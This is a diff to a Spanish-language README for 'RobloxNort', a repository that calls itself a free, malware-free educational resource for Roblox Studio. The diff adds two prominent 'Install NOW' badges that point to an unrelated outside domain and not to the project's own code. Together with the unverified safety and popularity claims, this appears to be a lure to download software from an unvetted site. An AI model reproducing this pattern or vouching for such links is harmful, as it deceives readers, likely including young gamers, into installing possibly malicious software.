@@ -1,6 +1,10 @@
 # 🎮 RobloxNort  
 
+![Vista Previa](https://i.imgur.com/1YEpsDp.png) 
+
 ![Visitantes: 10K+](https://img.shields.io/badge/Visitantes-10K+-ff9f43) ![Actualizado: Septiembre 2025](https://img.shields.io/badge/Actualizado-Septiembre_2025-3498db)  
+
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
 
 **Descripción**  
 **RobloxNort** es un recurso educativo gratuito de 2025 para aprender diseño de juegos en Roblox Studio (1.20+). Diseñado para proyectos de un solo jugador, es seguro, de código abierto y cumple con los Términos de Servicio de GitHub y Roblox. ¡Únete a 10K+ usuarios para crear tus propias experiencias en Roblox!  
@@ -33,6 +37,9 @@ RobloxNort es exclusivamente para uso local en Roblox Studio (modo de un solo ju
 - 🔐 Código abierto, licencia MIT, sin malware.  
 - ✅ Usado por 10K+ aprendices globalmente.  
 - 🕵 Sin recolección de datos.  
+
+
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
 
 **Captura de Pantalla**  
 **RobloxNort en Acción**  
